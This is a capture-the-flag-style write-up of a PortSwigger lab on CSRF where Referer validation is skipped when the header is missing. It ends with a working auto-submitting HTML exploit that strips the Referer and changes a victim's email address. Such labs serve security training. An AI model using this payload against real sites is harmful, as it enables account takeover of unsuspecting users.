# [Lab: CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)

## Lab

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

## Analysis

Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.

## Solutions

craft CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:

`<meta name="referrer" content="never">`

poc:

```html
<html>
<head>
<meta name="referrer" content="never">
</head>
    <body>
        <form action="https://id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
